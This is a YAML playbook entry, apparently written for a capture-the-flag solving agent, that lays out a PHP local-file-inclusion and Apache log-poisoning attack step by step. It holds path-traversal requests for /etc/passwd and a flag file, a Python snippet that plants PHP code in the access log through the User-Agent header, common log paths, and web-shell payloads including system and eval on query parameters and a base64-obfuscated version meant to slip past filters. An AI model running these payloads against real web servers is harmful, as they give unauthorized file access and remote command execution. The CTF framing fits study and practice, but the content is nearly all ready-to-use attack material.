name: php_lfi_log_poisoning
category: web
tags: [lfi, log_poisoning, php, apache, path_traversal]
indicators:
  - "PHP include/require with user-controlled input"
  - "File path concatenation without sanitization"
  - "Apache access.log with write permissions"
  - "post.php?id= or similar file inclusion parameter"
  - "Error reporting disabled (error_reporting(0))"

tricks:
  - name: "Step 1: Identify LFI vulnerability"
    when: "Found URL pattern like post.php?id=xxx"
    how: "Check if file path is directly concatenated without filtering"
    payload: |
      # Vulnerable code pattern:
      # $file_to_include = $posts_path . $_GET['id'];
      # include($file_to_include);
      
      # Test with path traversal:
      GET /post.php?id=../../../etc/passwd

  - name: "Step 2: Direct LFI to read flag"
    when: "LFI confirmed, flag location known"
    how: "Use path traversal to include flag file directly"
    payload: |
      # If flag is at /FLAG.php and current path is posts/
      # Need to traverse up: ../../../FLAG.php
      
      GET /post.php?id=../../../FLAG.php

  - name: "Step 3: Log Poisoning attack"
    when: "Direct file read doesn't work, need code execution"
    how: "Inject PHP code into Apache access.log via User-Agent, then include log"
    payload: |
      # Step 1: Poison the log with PHP code
      import requests
      
      php_payload = "<?php echo file_get_contents('/FLAG.php'); ?>"
      headers = {"User-Agent": php_payload}
      requests.get(target, headers=headers)
      
      # Step 2: Include the poisoned log file
      GET /post.php?id=../../../../var/log/apache2/access.log

  - name: "Common Apache log paths"
    when: "Need to find log file location"
    how: "Try different common paths"
    payload: |
      /var/log/apache2/access.log    # Debian/Ubuntu
      /var/log/apache/access.log     # Some distros
      /var/log/httpd/access_log      # RHEL/CentOS
      /var/log/nginx/access.log      # Nginx
      
      # With different traversal depths:
      ../../../var/log/apache2/access.log
      ../../../../var/log/apache2/access.log

  - name: "Alternative payloads for log poisoning"
    when: "Basic payload doesn't work"
    how: "Try different PHP code injection methods"
    payload: |
      # Read specific file
      <?php echo file_get_contents('/FLAG.php'); ?>
      
      # System command execution
      <?php system($_GET['cmd']); ?>
      
      # Eval for more flexibility
      <?php eval($_GET['c']); ?>
      
      # Base64 encoded to bypass filters
      <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

